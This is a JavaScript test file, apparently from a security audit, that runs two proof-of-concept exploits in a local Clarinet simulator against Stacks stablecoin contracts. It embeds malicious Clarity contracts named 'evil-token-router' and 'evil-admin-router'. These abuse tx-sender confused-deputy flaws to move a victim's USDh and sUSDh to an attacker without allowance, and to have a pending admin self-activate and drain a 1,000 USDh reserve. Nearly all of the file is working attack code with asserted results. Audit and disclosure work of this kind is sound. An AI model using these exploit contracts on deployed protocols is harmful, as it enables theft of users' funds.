import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const manifest = 'tests/security/standalone/Clarinet.toml';
const BASE = 100_000_000n;

function cv(result) {
  return cvToString(result.result);
}
function expectCv(label, result, expected) {
  const actual = cv(result);
  console.log(`${label}: ${actual}`);
  assert.equal(actual, expected, `${label}: expected ${expected}, got ${actual}`);
}
function valueUint(result) {
  return BigInt(result.result.value.value);
}

async function setup() {
  const simnet = await initSimnet(manifest);
  const accounts = simnet.getAccounts();
  const deployer = accounts.get('deployer');
  const trader = accounts.get('wallet_1');
  const attacker = accounts.get('wallet_2');
  const victim = accounts.get('wallet_3');
  if (!deployer || !trader || !attacker || !victim) throw new Error('missing simnet accounts');

  const c = (name) => `${deployer}.${name}`;
  const pub = (contract, method, args, sender) => simnet.callPublicFn(c(contract), method, args, sender);
  const ro = (contract, method, args, sender = deployer) => simnet.callReadOnlyFn(c(contract), method, args, sender);
  const balance = (token, who) => {
    const r = ro(token, 'get-balance', [Cl.principal(who)]);
    console.log(`${token}.balance(${who}): ${cv(r)}`);
    return valueUint(r);
  };

  expectCv('hq.set-contract-active(deployer)', pub('hq', 'set-contract-active', [Cl.principal(deployer), Cl.bool(true)], deployer), '(ok true)');
  expectCv('minting-state.set-whitelist-enabled(false)', pub('minting-state', 'set-whitelist-enabled', [Cl.bool(false)], deployer), '(ok true)');
  expectCv('minting-otc.set-trader', pub('minting-otc', 'set-trader', [Cl.principal(trader), Cl.bool(true), Cl.bool(false)], deployer), '(ok true)');

  return { simnet, accounts, deployer, trader, attacker, victim, c, pub, ro, balance };
}

async function proveTokenTheft() {
  console.log('\n=== PoC #6: tx-sender token theft through malicious contract ===');
  const { simnet, deployer, trader, attacker, victim, c, pub, balance } = await setup();

  // Fund victim with 200 USDh through the real local minting path.
  expectCv('fund victim 200 USDh', pub('minting-otc', 'confirm-mint', [
    Cl.stringAscii('victim-200'),
    Cl.principal(victim),
    Cl.uint(200n * BASE),
    Cl.uint(BASE),
  ], trader), '(ok true)');

  // Convert half to sUSDh so both vulnerable token contracts hold victim funds.
  expectCv('victim stakes 100 USDh', pub('staking', 'stake', [Cl.uint(100n * BASE), Cl.none()], victim), '(ok true)');
  assert.equal(balance('usdh-token', victim), 100n * BASE);
  assert.equal(balance('susdh-token', victim), 100n * BASE);

  const evilSource = `
    (define-public (steal-both (usdh-amount uint) (susdh-amount uint) (recipient principal))
      (begin
        ;; tx-sender remains the external user who invoked this contract.
        ;; Both tokens authorize sender == tx-sender even though this contract
        ;; is the immediate contract-caller and has no allowance.
        (try! (contract-call? '${deployer}.usdh-token transfer usdh-amount tx-sender recipient none))
        (try! (contract-call? '${deployer}.susdh-token transfer susdh-amount tx-sender recipient none))
        (ok true)))
  `;
  const deployment = simnet.deployContract('evil-token-router', evilSource, { clarityVersion: 2 }, attacker);
  console.log(`deploy evil-token-router: ${cv(deployment)}`);
  const evil = `${attacker}.evil-token-router`;

  // Victim calls ONLY the malicious contract. No USDh/sUSDh approval exists,
  // and victim never directly invokes either token's transfer function.
  const stolen = simnet.callPublicFn(evil, 'steal-both', [
    Cl.uint(100n * BASE),
    Cl.uint(100n * BASE),
    Cl.principal(attacker),
  ], victim);
  expectCv('victim -> evil-token-router.steal-both', stolen, '(ok true)');

  const victimUsdh = balance('usdh-token', victim);
  const victimSusdh = balance('susdh-token', victim);
  const attackerUsdh = balance('usdh-token', attacker);
  const attackerSusdh = balance('susdh-token', attacker);

  assert.equal(victimUsdh, 0n);
  assert.equal(victimSusdh, 0n);
  assert.equal(attackerUsdh, 100n * BASE);
  assert.equal(attackerSusdh, 100n * BASE);

  console.log('PASS #6: victim calling one malicious contract transfers 100 USDh + 100 sUSDh to attacker without allowance.');
}

async function provePendingAdminHijack() {
  console.log('\n=== PoC #5: pending-admin tx-sender self-activation -> reserve drain ===');
  const { simnet, deployer, trader, attacker, victim: pendingAdmin, c, pub, ro, balance } = await setup();
  const redeemingReserve = c('redeeming-reserve');

  // Fund the real redeeming-reserve with 1000 USDh.
  expectCv('fund deployer 1000 USDh', pub('minting-otc', 'confirm-mint', [
    Cl.stringAscii('reserve-1000'),
    Cl.principal(deployer),
    Cl.uint(1_000n * BASE),
    Cl.uint(BASE),
  ], trader), '(ok true)');
  expectCv('deployer funds redeeming-reserve', pub('usdh-token', 'transfer', [
    Cl.uint(1_000n * BASE),
    Cl.principal(deployer),
    Cl.principal(redeemingReserve),
    Cl.none(),
  ], deployer), '(ok true)');
  assert.equal(balance('usdh-token', redeemingReserve), 1_000n * BASE);

  const evilSource = `
    (define-public (activate-authorize-and-drain (amount uint) (recipient principal))
      (begin
        ;; HQ authenticates activate-admin against tx-sender. In this nested
        ;; call tx-sender is still the legitimately nominated pending admin.
        (try! (contract-call? '${deployer}.hq activate-admin tx-sender))

        ;; Now the same preserved tx-sender is an active admin, so this nested
        ;; call authorizes the malicious contract itself as protocol-active.
        (try! (contract-call? '${deployer}.hq set-contract-active current-contract true))

        ;; redeeming-reserve trusts any active protocol contract-caller and
        ;; skips the manager-only authorized-recipient restriction.
        (contract-call? '${deployer}.redeeming-reserve transfer
          amount recipient '${deployer}.usdh-token none)))
  `;
  const deployment = simnet.deployContract('evil-admin-router', evilSource, { clarityVersion: 2 }, attacker);
  console.log(`deploy evil-admin-router: ${cv(deployment)}`);
  const evil = `${attacker}.evil-admin-router`;

  // Legitimate owner nominates pendingAdmin.
  expectCv('owner request-admin-update(pendingAdmin)', pub('hq', 'request-admin-update', [Cl.principal(pendingAdmin)], deployer), '(ok true)');

  // Wait past the production 1008-burn-block activation delay.
  simnet.mineEmptyBlocks(1_010);

  // pendingAdmin invokes ONLY attacker contract. It never directly invokes HQ,
  // never approves evil as protocol, and never calls redeeming-reserve.
  const result = simnet.callPublicFn(evil, 'activate-authorize-and-drain', [
    Cl.uint(1_000n * BASE),
    Cl.principal(attacker),
  ], pendingAdmin);
  expectCv('pendingAdmin -> evil-admin-router', result, '(ok (ok true))');

  const active = ro('hq', 'get-contract-active', [Cl.principal(evil)]);
  expectCv('hq.get-contract-active(evil)', active, 'true');
  const reserveAfter = balance('usdh-token', redeemingReserve);
  const attackerAfter = balance('usdh-token', attacker);

  assert.equal(reserveAfter, 0n);
  assert.equal(attackerAfter, 1_000n * BASE);

  console.log('PASS #5: nominated admin calling malicious contract activates itself, authorizes attacker contract, and drains 1000 USDh reserve in one transaction.');
}

await proveTokenTheft();
await provePendingAdminHijack();
console.log('\nALL CONFUSED-DEPUTY POCS PASSED');
